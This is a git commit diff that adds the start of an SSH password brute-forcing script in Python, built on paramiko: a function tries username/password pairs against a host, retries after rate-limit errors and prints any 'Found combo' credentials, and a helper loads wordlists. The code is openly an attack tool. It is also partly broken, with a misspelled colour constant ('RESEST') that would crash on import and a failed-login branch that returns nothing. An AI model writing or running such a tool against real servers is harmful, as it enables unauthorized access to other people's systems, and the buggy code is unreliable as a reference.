a63d86c8131ec6c689bca43dca901731eb03a4a5
Joseph <joseph.hansjpedronan@gmail.com>
2026-09-11 19:13:02 -0700

    advanced_brute

--- ssh_brute/advanced_brute.py
+++ ssh_brute/advanced_brute.py
@@ -10,3 +10,34 @@ import queue
 import sys
 
 
+init()
+
+GREEN = Fore.GREEN
+BLUE = Fore.BLUE
+RESET = Fore.RESEST
+RED = Fore.RED
+
+q = queue.Queue()
+
+def is_ssh_open(hostname, username, password):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        client.connect(hostname=hostname, username=username, password=password)
+    except socket.timeout:
+        print(f"{RED}[-] Host: {hostname} is unreachable. Time out.{RESET}")
+        return False
+    except paramiko.AuthenticationException:
+        print(f"[-] Invalid credentials fro {username}:{password}")
+    except paramiko.SSHException:
+        print(f"{BLUE} [*] Retrying with delay...{RESET}")
+        time.sleep(60)
+        return is_ssh_open(hostname, username, password)
+    else:
+        print(f"{GREEN} Found combo: \n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
+        return True
+
+def load_lines(file_path):
+    with open(file_path, 'r') as file:
+        lines = file.read().splitlines()
+    return lines
